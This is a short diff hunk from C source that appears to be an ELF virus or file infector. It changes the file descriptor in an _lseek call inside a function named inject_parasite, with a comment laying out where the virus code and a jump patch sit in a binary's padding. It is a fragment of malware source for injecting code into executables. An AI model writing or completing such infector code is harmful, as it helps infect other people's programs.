@@ -390,7 +390,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 		 * paddingSize=[virusInit][JMP_PATCH][virus_Remaining][pad]
 		 */
         uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
-        if ((c = _lseek(fdo, offset, SEEK_SET)) != offset) 
+        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
 		return -1;
         
         /*
